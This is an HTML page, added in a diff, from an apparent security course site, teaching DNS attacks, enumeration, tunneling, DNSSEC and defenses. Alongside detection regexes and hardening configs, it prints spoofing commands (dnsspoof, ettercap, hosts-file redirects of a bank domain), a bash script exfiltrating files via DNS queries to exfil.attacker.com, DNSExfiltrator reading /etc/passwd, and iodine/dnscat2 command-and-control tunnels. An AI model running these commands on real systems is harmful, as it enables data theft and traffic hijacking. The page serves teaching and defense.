@@ -1,0 +1,794 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DNS Security - ABID HACKER</title>
+    
+    <!-- Bootstrap CSS CDN -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    
+    <!-- Font Awesome CDN -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="../../css/style.css">
+</head>
+<body>
+    <!-- Navigation Bar -->
+    <nav class="navbar navbar-expand-lg navbar-dark bg-dark fixed-top">
+        <div class="container">
+            <a class="navbar-brand" href="../../index.html">
+                <i class="fas fa-shield-alt"></i> ABID HACKER
+            </a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ms-auto">
+                    <li class="nav-item">
+                        <a class="nav-link" href="../../index.html">Home</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="../courses.html">Courses</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="../about.html">About</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="../contact.html">Contact</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="container my-5" style="margin-top: 100px !important;">
+        <div class="row">
+            <!-- Sidebar Navigation -->
+            <div class="col-lg-3">
+                <div class="card border-success sticky-top" style="top: 100px;">
+                    <div class="card-header bg-success text-white">
+                        <h6 class="mb-0">DNS Security</h6>
+                    </div>
+                    <div class="card-body p-0">
+                        <ul class="list-group list-group-flush">
+                            <li class="list-group-item bg-dark border-success">
+                                <a href="#introduction" class="text-success text-decoration-none">Introduction</a>
+                            </li>
+                            <li class="list-group-item bg-dark border-success">
+                                <a href="#dns-attacks" class="text-success text-decoration-none">DNS Attacks</a>
+                            </li>
+                            <li class="list-group-item bg-dark border-success">
+                                <a href="#dns-enumeration" class="text-success text-decoration-none">DNS Enumeration</a>
+                            </li>
+                            <li class="list-group-item bg-dark border-success">
+                                <a href="#dns-tunneling" class="text-success text-decoration-none">DNS Tunneling</a>
+                            </li>
+                            <li class="list-group-item bg-dark border-success">
+                                <a href="#dnssec" class="text-success text-decoration-none">DNSSEC</a>
+                            </li>
+                            <li class="list-group-item bg-dark border-success">
+                                <a href="#defense" class="text-success text-decoration-none">Defense Strategies</a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Main Content Area -->
+            <div class="col-lg-9">
+                <div class="card border-success">
+                    <div class="card-header bg-success text-white">
+                        <h1 class="mb-0"><i class="fas fa-globe"></i> DNS Security & Attacks</h1>
+                    </div>
+                    <div class="card-body">
+                        <!-- Introduction Section -->
+                        <section id="introduction" class="mb-5">
+                            <h2 class="text-success">DNS Security Overview</h2>
+                            <p class="lead">Domain Name System (DNS) security involves protecting DNS infrastructure from various attacks and ensuring the integrity and availability of DNS services.</p>
+                            
+                            <div class="alert alert-info">
+                                <i class="fas fa-info-circle"></i> <strong>Learning Objective:</strong> Understand DNS vulnerabilities, attack techniques, enumeration methods, and security implementations.
+                            </div>
+
+                            <h3 class="text-success mt-4">DNS Fundamentals</h3>
+                            <div class="code-block">
+# DNS Query Process
+1. User types www.example.com
+2. Browser checks local cache
+3. Query sent to recursive resolver
+4. Resolver queries root nameserver
+5. Root returns .com nameserver
+6. Resolver queries .com nameserver
+7. .com returns example.com nameserver
+8. Resolver queries example.com nameserver
+9. Returns IP address to client
+                            </div>
+
+                            <h3 class="text-success mt-4">DNS Record Types</h3>
+                            <div class="row">
+                                <div class="col-md-6">
+                                    <ul>
+                                        <li><strong>A:</strong> IPv4 address mapping</li>
+                                        <li><strong>AAAA:</strong> IPv6 address mapping</li>
+                                        <li><strong>CNAME:</strong> Canonical name alias</li>
+                                    </ul>
+                                </div>
+                                <div class="col-md-6">
+                                    <h4 class="text-warning">Attack Vectors</h4>
+                                    <ul>
+                                        <li><strong>DNS Spoofing:</strong> Fake DNS responses</li>
+                                        <li><strong>Domain Hijacking:</strong> Unauthorized domain control</li>
+                                        <li><strong>Subdomain Takeover:</strong> Claiming abandoned subdomains</li>
+                                        <li><strong>DNS Tunneling:</strong> Data exfiltration via DNS</li>
+                                        <li><strong>DDoS Attacks:</strong> Overwhelming DNS infrastructure</li>
+                                    </ul>
+                                </div>
+                            </div>
+
+                            <h3 class="text-success mt-4">DNS in the Attack Chain</h3>
+                            <div class="card bg-dark text-white mt-3">
+                                <div class="card-header">
+                                    <h5><i class="fas fa-link"></i> How Attackers Leverage DNS</h5>
+                                </div>
+                                <div class="card-body">
+                                    <ul>
+                                        <li><strong>Reconnaissance:</strong> DNS enumeration reveals network structure</li>
+                                        <li><strong>Initial Access:</strong> DNS spoofing redirects to malicious sites</li>
+                                        <li><strong>Command & Control:</strong> DNS tunneling for covert communication</li>
+                                        <li><strong>Data Exfiltration:</strong> Encoding data in DNS queries</li>
+                                        <li><strong>Persistence:</strong> DNS modifications for long-term access</li>
+                                        <li><strong>Lateral Movement:</strong> Internal DNS poisoning</li>
+                                    </ul>
+                                </div>
+                            </div>
+
+                            <h3 class="text-success mt-4">Modern DNS Security Solutions</h3>
+                            <p>Evolution of DNS security technologies:</p>
+                            <ul>
+                                <li><strong>DNSSEC:</strong> Digital signatures for DNS data integrity</li>
+                                <li><strong>DNS over HTTPS (DoH):</strong> Encrypted DNS queries via HTTPS</li>
+                                <li><strong>DNS over TLS (DoT):</strong> TLS encryption for DNS traffic</li>
+                                <li><strong>DNS Filtering:</strong> Blocking malicious domains</li>
+                                <li><strong>Threat Intelligence:</strong> Real-time malicious domain feeds</li>
+                                <li><strong>DNS Monitoring:</strong> Anomaly detection in DNS traffic</li>
+                            </ul>
+
+                            <div class="alert alert-warning mt-4">
+                                <h4 class="text-dark"><i class="fas fa-shield-alt"></i> Security Best Practices</h4>
+                                <ul>
+                                    <li><strong>Implement DNSSEC:</strong> Verify DNS response authenticity</li>
+                                    <li><strong>Use Secure DNS:</strong> DoH/DoT for encrypted queries</li>
+                                    <li><strong>Monitor DNS Traffic:</strong> Detect anomalous patterns</li>
+                                    <li><strong>Regular Audits:</strong> Check DNS configurations</li>
+                                    <li><strong>Access Controls:</strong> Restrict DNS server management</li>
+                                </ul>
+                            </div>
+                        </section>
+
+                        <!-- DNS Attacks Section -->
+                        <section id="dns-attacks" class="mb-5">
+                            <h2 class="text-success">Common DNS Attacks</h2>
+                            
+                            <h3 class="text-success mt-4">DNS Cache Poisoning</h3>
+                            <div class="card bg-dark border-success mb-3">
+                                <div class="card-body">
+                                    <p class="text-light">Attacker corrupts DNS cache with false information, redirecting users to malicious sites.</p>
+                                    <div class="terminal">
+# Cache poisoning attack flow
+1. Attacker sends DNS query for target domain
+2. Quickly sends forged response before legitimate response
+3. Forged response contains malicious IP address
+4. DNS server caches the false information
+5. Subsequent queries return malicious IP
+
+# Tools for cache poisoning
+# DNSSpoof (part of dsniff)
+dnsspoof -i eth0 -f hosts.txt
+
+# Ettercap DNS spoofing
+ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100// -P dns_spoof
+
+# Custom hosts file for spoofing
+echo "192.168.1.50 www.bank.com" >> /etc/ettercap/etter.dns
+                                    </div>
+                                </div>
+                            </div>
+
+                            <h3 class="text-success mt-4">DNS Amplification DDoS</h3>
+                            <div class="card bg-dark border-success mb-3">
+                                <div class="card-body">
+                                    <p class="text-light">Exploits open DNS resolvers to amplify attack traffic against targets.</p>
+                                    <div class="terminal">
+# Amplification attack concept
+1. Attacker spoofs victim's IP address
+2. Sends small DNS queries to open resolvers
+3. Requests large responses (ANY, TXT records)
+4. Resolvers send large responses to victim
+5. Traffic amplified 50-100x original size
+
+# Finding open resolvers
+nmap -sU -p 53 --script dns-recursion 8.8.8.8
+
+# Testing amplification factor
+dig @8.8.8.8 ANY google.com
+dig @8.8.8.8 TXT google.com
+
+# Amplification tools (for testing only)
+# sadns - DNS amplification tool
+# DNS-Amplification-Toolkit
+                                    </div>
+                                </div>
+                            </div>
+
+                            <h3 class="text-success mt-4">DNS Hijacking</h3>
+                            <div class="card bg-dark border-success mb-3">
+                                <div class="card-body">
+                                    <p class="text-light">Unauthorized changes to DNS settings redirect traffic to attacker-controlled servers.</p>
+                                    <div class="terminal">
+# Types of DNS hijacking
+1. Router DNS hijacking - Compromise router settings
+2. Local DNS hijacking - Modify hosts file
+3. Registrar hijacking - Compromise domain registrar
+4. ISP DNS hijacking - Compromise ISP DNS servers
+
+# Local DNS hijacking (hosts file)
+# Windows: C:\Windows\System32\drivers\etc\hosts
+# Linux/Mac: /etc/hosts
+127.0.0.1 www.bank.com
+192.168.1.50 www.social-media.com
+
+# Router DNS modification
+# Access router admin panel
+# Change DNS servers to attacker-controlled
+# Primary DNS: 192.168.1.50
+# Secondary DNS: 8.8.8.8
+                                    </div>
+                                </div>
+                            </div>
+
+                            <h3 class="text-success mt-4">DNS Tunneling</h3>
+                            <div class="card bg-dark border-success">
+                                <div class="card-body">
+                                    <p class="text-light">Encapsulates non-DNS traffic within DNS queries to bypass firewalls and exfiltrate data.</p>
+                                    <div class="terminal">
+# DNS tunneling tools
+# Iodine - IP over DNS tunnel
+# Server setup
+iodined -f -c -P password 10.0.0.1 tunnel.example.com
+
+# Client connection
+iodine -f -P password tunnel.example.com
+
+# DNSCat2 - Data exfiltration
+# Server
+dnscat2-server tunnel.example.com
+
+# Client
+dnscat2 tunnel.example.com
+
+# Manual DNS tunneling
+# Encode data in subdomain
+echo "secret data" | base64 | tr -d '\n'
+# Result: c2VjcmV0IGRhdGE=
+# Query: c2VjcmV0IGRhdGE=.tunnel.example.com
+                                    </div>
+                                </div>
+                            </div>
+                        </section>
+
+                        <!-- DNS Enumeration Section -->
+                        <section id="dns-enumeration" class="mb-5">
+                            <h2 class="text-success">DNS Enumeration Techniques</h2>
+                            
+                            <h3 class="text-success mt-4">Basic DNS Queries</h3>
+                            <div class="terminal">
+# Standard DNS lookups
+nslookup example.com
+dig example.com
+host example.com
+
+# Specific record types
+dig A example.com
+dig AAAA example.com
+dig MX example.com
+dig NS example.com
+dig TXT example.com
+dig SOA example.com
+
+# Reverse DNS lookup
+dig -x 8.8.8.8
+nslookup 8.8.8.8
+
+# Query specific DNS server
+dig @8.8.8.8 example.com
+nslookup example.com 8.8.8.8
+                            </div>
+
+                            <h3 class="text-success mt-4">Zone Transfer Attacks</h3>
+                            <div class="terminal">
+# Attempt zone transfer (AXFR)
+dig axfr @ns1.example.com example.com
+nslookup
+> server ns1.example.com
+> set type=axfr
+> example.com
+
+# Find name servers first
+dig NS example.com
+
+# Test all name servers for zone transfer
+for ns in $(dig +short NS example.com); do
+    echo "Testing $ns"
+    dig axfr @$ns example.com
+done
+
+# Automated zone transfer testing
+dnsrecon -d example.com -t axfr
+fierce -dns example.com
+                            </div>
+
+                            <h3 class="text-success mt-4">DNS Brute Force</h3>
+                            <div class="terminal">
+# Subdomain brute force with dnsrecon
+dnsrecon -d example.com -t brt -D /usr/share/wordlists/dnsmap.txt
+
+# Subdomain enumeration with sublist3r
+sublist3r -d example.com -t 100
+
+# DNS brute force with fierce
+fierce -dns example.com -wordlist /usr/share/wordlists/dirb/common.txt
+
+# Custom subdomain brute force
+#!/bin/bash
+domain="example.com"
+wordlist="/usr/share/wordlists/subdomains.txt"
+
+while read subdomain; do
+    result=$(dig +short "$subdomain.$domain")
+    if [ ! -z "$result" ]; then
+        echo "$subdomain.$domain -> $result"
+    fi
+done < $wordlist
+
+# DNS enumeration with amass
+amass enum -d example.com
+amass enum -brute -d example.com -w /usr/share/wordlists/subdomains.txt
+                            </div>
+
+                            <h3 class="text-success mt-4">Advanced Enumeration</h3>
+                            <div class="terminal">
+# DNS cache snooping
+dig +norecurse @target-dns-server example.com
+
+# DNS version enumeration
+dig @target-dns-server version.bind chaos txt
+dig @target-dns-server hostname.bind chaos txt
+
+# DNS wildcard detection
+dig nonexistent-subdomain.example.com
+
+# DNS load balancer detection
+for i in {1..10}; do
+    dig +short example.com
+done
+
+# Certificate transparency logs
+curl -s "https://crt.sh/?q=%.example.com&output=json" | jq -r '.[].name_value' | sort -u
+
+# DNS reconnaissance with dnsenum
+dnsenum --enum example.com
+dnsenum --threads 50 --dnsserver 8.8.8.8 example.com
+                            </div>
+                        </section>
+
+                        <!-- DNS Tunneling Section -->
+                        <section id="dns-tunneling" class="mb-5">
+                            <h2 class="text-success">DNS Tunneling & Exfiltration</h2>
+                            
+                            <h3 class="text-success mt-4">Data Exfiltration via DNS</h3>
+                            <div class="terminal">
+# Base64 encoding for DNS exfiltration
+echo "sensitive data" | base64 | tr -d '\n'
+# Result: c2Vuc2l0aXZlIGRhdGE=
+
+# Split into DNS-safe chunks (max 63 chars per label)
+echo "c2Vuc2l0aXZlIGRhdGE=" | fold -w 50
+
+# DNS query with encoded data
+dig c2Vuc2l0aXZlIGRhdGE=.exfil.attacker.com
+
+# Automated data exfiltration script
+#!/bin/bash
+file="$1"
+domain="exfil.attacker.com"
+
+base64 -w 0 "$file" | fold -w 50 | while read chunk; do
+    dig "$chunk.$domain" > /dev/null 2>&1
+    sleep 1
+done
+
+# DNS exfiltration with DNSExfiltrator
+python DNSExfiltrator.py -d attacker.com -f /etc/passwd
+python DNSExfiltrator.py -d attacker.com -s "SELECT * FROM users"
+                            </div>
+
+                            <h3 class="text-success mt-4">DNS Covert Channels</h3>
+                            <div class="terminal">
+# Iodine tunnel setup
+# Server (attacker machine)
+iodined -f -c -P secretpassword 10.0.0.1/24 tunnel.attacker.com
+
+# Client (compromised machine)
+iodine -f -P secretpassword tunnel.attacker.com
+
+# Once connected, use the tunnel
+ssh user@10.0.0.1  # SSH through DNS tunnel
+curl --interface tun0 http://10.0.0.1:8080/  # HTTP through tunnel
+
+# DNSCat2 for command and control
+# Server
+dnscat2-server --dns host=0.0.0.0,port=53,domain=tunnel.attacker.com
+
+# Client
+dnscat2 tunnel.attacker.com
+
+# DNS2TCP tunnel
+# Server
+dns2tcpd -f dns2tcpd.conf
+# Config file specifies listening ports and allowed resources
+
+# Client
+dns2tcpc -r ssh -k mykey -z tunnel.attacker.com 127.0.0.1
+                            </div>
+
+                            <h3 class="text-success mt-4">Detection of DNS Tunneling</h3>
+                            <div class="terminal">
+# Monitoring DNS traffic patterns
+# High volume of DNS queries to single domain
+# Unusual query types (TXT, NULL)
+# Long subdomain names
+# Regular intervals between queries
+# Base64-like patterns in queries
+
+# Detection tools and techniques
+# Monitor DNS query logs
+tail -f /var/log/named/query.log | grep -E '[A-Za-z0-9+/]{20,}'
+
+# Statistical analysis
+# Count queries per domain
+awk '{print $9}' /var/log/named/query.log | sort | uniq -c | sort -nr
+
+# Detect base64 patterns
+grep -E '[A-Za-z0-9+/]{30,}' /var/log/named/query.log
+
+# Network monitoring with tcpdump
+tcpdump -i any -n port 53 -A | grep -E '[A-Za-z0-9+/]{20,}'
+
+# DNS tunneling detection with Python
+import re
+import base64
+
+def detect_dns_tunneling(query):
+    # Check for base64 patterns
+    if re.match(r'^[A-Za-z0-9+/]{20,}={0,2}$', query.split('.')[0]):
+        return True
+    
+    # Check query length
+    if len(query.split('.')[0]) > 50:
+        return True
+    
+    return False
+                            </div>
+                        </section>
+
+                        <!-- DNSSEC Section -->
+                        <section id="dnssec" class="mb-5">
+                            <h2 class="text-success">DNSSEC Implementation</h2>
+                            
+                            <h3 class="text-success mt-4">DNSSEC Overview</h3>
+                            <div class="code-block">
+# DNSSEC provides:
+1. Data integrity - Ensures DNS data hasn't been modified
+2. Data origin authentication - Verifies the source of DNS data
+3. Authenticated denial of existence - Proves non-existent records
+
+# DNSSEC Record Types:
+- RRSIG: Resource Record Signature
+- DNSKEY: DNS Public Key
+- DS: Delegation Signer
+- NSEC/NSEC3: Next Secure (denial of existence)
+- CDNSKEY: Child DNS Key
+- CDS: Child Delegation Signer
+                            </div>
+
+                            <h3 class="text-success mt-4">DNSSEC Validation</h3>
+                            <div class="terminal">
+# Check DNSSEC status
+dig +dnssec example.com
+dig +dnssec +multi example.com
+
+# Validate DNSSEC chain
+dig +dnssec +trace example.com
+
+# Check specific DNSSEC records
+dig DNSKEY example.com
+dig DS example.com
+dig RRSIG example.com
+
+# DNSSEC validation tools
+# Unbound DNS validator
+unbound-checkconf
+unbound-control status
+
+# BIND DNSSEC tools
+named-checkzone example.com /var/named/example.com.zone
+dnssec-verify -o example.com /var/named/example.com.zone.signed
+
+# Online DNSSEC validators
+# https://dnssec-analyzer.verisignlabs.com/
+# https://dnsviz.net/
+                            </div>
+
+                            <h3 class="text-success mt-4">DNSSEC Configuration</h3>
+                            <div class="terminal">
+# Generate DNSSEC keys (BIND)
+dnssec-keygen -a RSASHA256 -b 2048 -f KSK example.com
+dnssec-keygen -a RSASHA256 -b 1024 example.com
+
+# Sign the zone
+dnssec-signzone -o example.com -k Kexample.com.+008+12345.key example.com.zone Kexample.com.+008+54321.key
+
+# BIND named.conf DNSSEC configuration
+zone "example.com" {
+    type master;
+    file "/var/named/example.com.zone.signed";
+    key-directory "/var/named/keys";
+    auto-dnssec maintain;
+    inline-signing yes;
+};
+
+# Enable DNSSEC validation
+options {
+    dnssec-enable yes;
+    dnssec-validation yes;
+    dnssec-lookaside auto;
+};
+
+# PowerDNS DNSSEC
+pdnsutil secure-zone example.com
+pdnsutil add-zone-key example.com ksk active 2048 rsasha256
+pdnsutil add-zone-key example.com zsk active 1024 rsasha256
+                            </div>
+                        </section>
+
+                        <!-- Defense Section -->
+                        <section id="defense" class="mb-5">
+                            <h2 class="text-success">DNS Security Defense Strategies</h2>
+                            
+                            <h3 class="text-success mt-4">DNS Server Hardening</h3>
+                            <div class="terminal">
+# BIND security configuration
+options {
+    // Disable version disclosure
+    version "DNS Server";
+    
+    // Restrict zone transfers
+    allow-transfer { "none"; };
+    
+    // Disable recursion for external queries
+    recursion no;
+    allow-recursion { localhost; 192.168.1.0/24; };
+    
+    // Rate limiting
+    rate-limit {
+        responses-per-second 10;
+        window 5;
+    };
+    
+    // Hide DNS server details
+    hostname none;
+    server-id none;
+};
+
+# Zone-specific security
+zone "example.com" {
+    type master;
+    file "/var/named/example.com.zone";
+    allow-transfer { 192.168.1.10; };  // Secondary DNS only
+    allow-query { any; };
+    allow-update { none; };
+};
+
+# PowerDNS security settings
+# /etc/powerdns/pdns.conf
+version-string=PowerDNS
+security-poll-suffix=
+disable-axfr=yes
+allow-axfr-ips=192.168.1.10
+query-logging=yes
+                            </div>
+
+                            <h3 class="text-success mt-4">DNS Filtering & Monitoring</h3>
+                            <div class="terminal">
+# DNS sinkholing for malware domains
+# BIND RPZ (Response Policy Zone)
+zone "rpz.local" {
+    type master;
+    file "/var/named/rpz.local.zone";
+    allow-query { localhost; };
+};
+
+# RPZ zone file
+$TTL 60
+@   IN  SOA localhost. admin.localhost. (
+    1 3600 1800 604800 60 )
+    IN  NS  localhost.
+
+; Sinkhole malicious domains
+malware.com         CNAME   .
+*.malware.com       CNAME   .
+phishing.net        A       127.0.0.1
+
+# Pi-hole for DNS filtering
+# Install Pi-hole
+curl -sSL https://install.pi-hole.net | bash
+
+# Add custom blocklists
+echo "https://someonewhocares.org/hosts/zero/hosts" >> /etc/pihole/adlists.list
+pihole -g  # Update gravity
+
+# DNS monitoring with ELK stack
+# Logstash configuration for DNS logs
+input {
+  file {
+    path => "/var/log/named/query.log"
+    type => "dns"
+  }
+}
+
+filter {
+  if [type] == "dns" {
+    grok {
+      match => { "message" => "%{TIMESTAMP_ISO8601:timestamp} %{WORD:log_level} %{GREEDYDATA:dns_query}" }
+    }
+  }
+}
+
+output {
+  elasticsearch {
+    hosts => ["localhost:9200"]
+    index => "dns-logs-%{+YYYY.MM.dd}"
+  }
+}
+                            </div>
+
+                            <h3 class="text-success mt-4">DNS over HTTPS/TLS</h3>
+                            <div class="terminal">
+# DNS over HTTPS (DoH) configuration
+# Cloudflare DoH
+curl -H 'accept: application/dns-json' 'https://cloudflare-dns.com/dns-query?name=example.com&type=A'
+
+# Google DoH
+curl -H 'accept: application/dns-json' 'https://dns.google/resolve?name=example.com&type=A'
+
+# DNS over TLS (DoT) with Unbound
+# /etc/unbound/unbound.conf
+server:
+    tls-cert-bundle: "/etc/ssl/certs/ca-certificates.crt"
+
+forward-zone:
+    name: "."
+    forward-tls-upstream: yes
+    forward-addr: 1.1.1.1@853#cloudflare-dns.com
+    forward-addr: 8.8.8.8@853#dns.google
+
+# Stubby for DoT
+# /etc/stubby/stubby.yml
+resolution_type: GETDNS_RESOLUTION_STUB
+dns_transport_list:
+  - GETDNS_TRANSPORT_TLS
+tls_authentication: GETDNS_AUTHENTICATION_REQUIRED
+upstream_recursive_servers:
+  - address_data: 1.1.1.1
+    tls_auth_name: "cloudflare-dns.com"
+  - address_data: 8.8.8.8
+    tls_auth_name: "dns.google"
+
+# Configure clients for DoH/DoT
+# Firefox about:config
+network.trr.mode = 2
+network.trr.uri = https://cloudflare-dns.com/dns-query
+
+# systemd-resolved DoT
+echo "DNS=1.1.1.1#cloudflare-dns.com" >> /etc/systemd/resolved.conf
+echo "DNSSEC=yes" >> /etc/systemd/resolved.conf
+systemctl restart systemd-resolved
+                            </div>
+
+                            <h3 class="text-success mt-4">Incident Response</h3>
+                            <div class="terminal">
+# DNS incident response checklist
+1. Identify affected domains/records
+2. Check DNS logs for suspicious queries
+3. Verify DNSSEC chain integrity
+4. Analyze traffic patterns
+5. Update DNS records if compromised
+6. Implement additional monitoring
+
+# DNS forensics commands
+# Analyze DNS query logs
+grep -E "(malware|phishing|suspicious)" /var/log/named/query.log
+
+# Check for DNS amplification attacks
+netstat -su | grep -i udp
+ss -u -a | grep :53
+
+# Monitor real-time DNS queries
+tcpdump -i any -n port 53 -c 100
+
+# DNS cache analysis
+dig +noall +answer example.com @local-dns-server
+rndc dumpdb -cache
+grep "example.com" /var/named/data/cache_dump.db
+
+# Incident response automation
+#!/bin/bash
+# DNS incident response script
+DOMAIN=$1
+LOG_FILE="/var/log/dns_incident_$(date +%Y%m%d_%H%M%S).log"
+
+echo "DNS Incident Response for $DOMAIN" > $LOG_FILE
+echo "Timestamp: $(date)" >> $LOG_FILE
+
+# Check current DNS records
+echo "=== Current DNS Records ===" >> $LOG_FILE
+dig ANY $DOMAIN >> $LOG_FILE
+
+# Check DNSSEC status
+echo "=== DNSSEC Status ===" >> $LOG_FILE
+dig +dnssec $DOMAIN >> $LOG_FILE
+
+# Analyze recent queries
+echo "=== Recent Queries ===" >> $LOG_FILE
+grep $DOMAIN /var/log/named/query.log | tail -100 >> $LOG_FILE
+                            </div>
+                        </section>
+
+                        <!-- Navigation -->
+                        <div class="d-flex justify-content-between mt-5">
+                            <a href="../web-security/csrf-attacks.html" class="btn btn-outline-success">
+                                <i class="fas fa-arrow-left"></i> Previous: CSRF Attacks
+                            </a>
+                            <a href="firewall-bypassing.html" class="btn btn-success">
+                                Next: Firewall Bypassing <i class="fas fa-arrow-right"></i>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-dark text-white py-4 mt-5">
+        <div class="container">
+            <div class="text-center">
+                <p>&copy; 2024 ABID HACKER. Created by Abid Mehmood - Professional Web Designer</p>
+                <p>Email: abidbusiness@gmail.com | Phone: 03029382306</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Bootstrap JS CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    
+    <!-- jQuery CDN -->
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    
+    <!-- Custom JS -->
+    <script src="../../js/script.js"></script>
+</body>
+</html>
